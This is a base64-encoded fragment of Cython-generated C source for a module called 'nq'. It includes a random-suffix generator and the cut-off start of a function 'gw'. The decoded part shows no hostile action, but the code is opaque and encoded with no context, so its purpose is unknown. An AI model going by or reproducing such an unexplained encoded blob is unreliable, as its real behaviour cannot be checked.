wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygibnEuZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJucV9nZW5lcmF0ZV9yYW5kb21fc3VmZml4KF9fcHl4X3NlbGYsIF9fcHl4X3ZfbGVuZ3RoKTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJucV8yMmdlbmVyYXRlX3JhbmRvbV9zdWZmaXhfMmdlbmVyYXRvcihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJucV8yMmdlbmVyYXRlX3JhbmRvbV9zdWZmaXhfZ2VuZXhwcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCkge1xuICBzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIF9fcHl4X2N1cl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKilfX3B5eF90cF9uZXdfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgTlVMTCk7XG4gIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkge1xuICAgIF9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopUHlfTm9uZSk7XG4gICAgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICAgIF9fUFlYX0VSUigwLCAxNiwgX19weXhfTDFfZXJyb3IpXG4gIH0gZWxzZSB7XG4gICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIH1cbiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wID0gX19weXhfZ2VuZXhwcl9hcmdfMDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMm5xXzIyZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeF8yZ2VuZXJhdG9yLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMF0pLCAoUHlPYmplY3QgKikgX19weXhfY3VyX3Njb3BlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmVyYXRlX3JhbmRvbV9zdWZmaXhfbG9jYWxzX2dlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbnEpOyBpZiAodW5saWtlbHkoIWdlbikpIF9fUFlYX0VSUigwLCAxNiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7XG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47XG4gIH1cblxuICBcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9BZGRUcmFjZWJhY2soIm5xLmdlbmVyYXRlX3JhbmRvbV9zdWZmaXguZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfREVDUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMm5xXzIyZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeF8yZ2VuZXJhdG9yKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpIFxue1xuICBzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJlKTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlfc3NpemVfdCBfX3B5eF90XzI7XG4gIFB5T2JqZWN0ICooKl9fcHl4X3RfMykoUHlPYmplY3QgKik7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApO1xuICBzd2l0Y2ggKF9fcHl4X2dlbmVyYXRvci0+cmVzdW1lX2xhYmVsKSB7XG4gICAgY2FzZSAwOiBnb3RvIF9fcHl4X0wzX2ZpcnN0X3J1bjtcbiAgICBkZWZhdWx0OiBcbiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgICByZXR1cm4gTlVMTDtcbiAgfVxuICBfX3B5eF9MM19maXJzdF9ydW46O1xuICBpZiAodW5saWtlbHkoIV9fcHl4X3NlbnRfdmFsdWUpKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDE2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3IpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHsgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcigiLjAiKTsgX19QWVhfRVJSKDAsIDE2LCBfX3B5eF9MMV9lcnJvcikgfVxuICBpZiAobGlrZWx5KFB5TGlzdF9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHx8IFB5VHVwbGVfQ2hlY2tFeGFjdChfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7XG4gICAgX19weXhfdF8xID0gX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wOyBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTtcbiAgICBfX3B5eF90XzIgPSAwO1xuICAgIF9fcHl4X3RfMyA9IE5VTEw7XG4gIH0gZWxzZSB7XG4gICAgX19weXhfdF8yID0gLTE7IF9fcHl4X3RfMSA9IFB5T2JqZWN0X0dldEl0ZXIoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDE2LCBfX3B5eF9MMV9lcnJvcilcbiAgfVxuICBmb3IgKDs7KSB7XG4gICAgaWYgKGxpa2VseSghX19weXhfdF8zKSkge1xuICAgICAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF90XzEpKSkge1xuICAgICAgICB7XG4gICAgICAgICAgUHlfc3NpemVfdCBfX3B5eF90ZW1wID0gX19QeXhfUHlMaXN0X0dFVF9TSVpFKF9fcHl4X3RfMSk7XG4gICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDE2LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKF9fcHl4X3RfMSwgX19weXhfdF8yKTtcbiAgICAgICAgKytfX3B5eF90XzI7XG4gICAgICB9IGVsc2Uge1xuICAgICAgICB7XG4gICAgICAgICAgUHlfc3NpemVfdCBfX3B5eF90ZW1wID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShfX3B5eF90XzEpO1xuICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxNiwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhaztcbiAgICAgICAgfVxuICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfTmV3UmVmKFB5VHVwbGVfR0VUX0lURU0oX19weXhfdF8xLCBfX3B5eF90XzIpKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICsrX19weXhfdF8yO1xuICAgICAgfVxuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKVxuICAgIH0gZWxzZSB7XG4gICAgICBfX3B5eF90XzQgPSBfX3B5eF90XzMoX19weXhfdF8xKTtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkge1xuICAgICAgICBQeU9iamVjdCogZXhjX3R5cGUgPSBQeUVycl9PY2N1cnJlZCgpO1xuICAgICAgICBpZiAoZXhjX3R5cGUpIHtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIH1cbiAgICAgICAgYnJlYWs7XG4gICAgICB9XG4gICAgfVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X18pO1xuICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9fLCBfX3B5eF90XzQpO1xuICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF80KTtcbiAgICBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZGludCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE2LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X0xpc3RDb21wX0FwcGVuZChfX3B5eF9yLCAoUHlPYmplY3QqKV9fcHl4X3RfNSkpKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihfX3B5eF9jdXJfc2NvcGUpO1xuXG4gIFxuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBpZiAoX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oMCk7XG4gICAgX19QeXhfQWRkVHJhY2ViYWNrKCJnZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIH1cbiAgX19weXhfTDA6O1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgI2lmICFDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7XG4gICNlbmRpZlxuICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IC0xO1xuICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoKFB5T2JqZWN0KilfX3B5eF9nZW5lcmF0b3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJucV9nZW5lcmF0ZV9yYW5kb21fc3VmZml4KENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2xlbmd0aCkge1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X2NoYXJhY3RlcnMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfZ2JfMm5xXzIyZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeF8yZ2VuZXJhdG9yID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF80O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5lcmF0ZV9yYW5kb21fc3VmZml4IiwgMCk7XG5cbiAgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RyaW5nKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hc2NpaV91cHBlcmNhc2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdHJpbmcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RpZ2l0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDE1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBfX3B5eF90XzEgPSBQeU51bWJlcl9BZGQoX19weXhfdF8yLCBfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fcHl4X3ZfY2hhcmFjdGVycyA9IF9fcHl4X3RfMTtcbiAgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgX19weXhfdF8zID0gTlVMTDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcmFuZ2UpO1xuICBfX3B5eF90XzIgPSBfX3B5eF9idWlsdGluX3JhbmdlOyBcbiAgX19weXhfdF80ID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIF9fcHl4X3ZfbGVuZ3RofTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDE2LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgfVxuICBfX3B5eF90XzIgPSBfX3B5eF9wZl8ybnFfMjJnZW5lcmF0ZV9yYW5kb21fc3VmZml4X2dlbmV4cHIoTlVMTCwgX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIF9fcHl4X3RfMSA9IF9fUHl4X0dlbmVyYXRvcl9HZXRJbmxpbmVkUmVzdWx0KF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDE2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX3B5eF90XzIgPSBQeVVuaWNvZGVfSm9pbihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XywgX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIF9fcHl4X3IgPSBfX3B5eF90XzI7XG4gIF9fcHl4X3RfMiA9IDA7XG4gIGdvdG8gX19weXhfTDA7XG5cbiAgXG5cbiAgXG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJucS5nZW5lcmF0ZV9yYW5kb21fc3VmZml4IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9jaGFyYWN0ZXJzKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8ybnFfMjJnZW5lcmF0ZV9yYW5kb21fc3VmZml4XzJnZW5lcmF0b3IpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJucV8zZ3coUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMm5xXzNndyA9IHsiZ3ciLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJucV8zZ3csIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJucV8zZ3coUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbikge1xuICBQeU9iamVjdCAqX19weXhfdl9sZW5ndGggPSAwO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJncztcbiAgI2VuZGlmXG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlcztcbiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1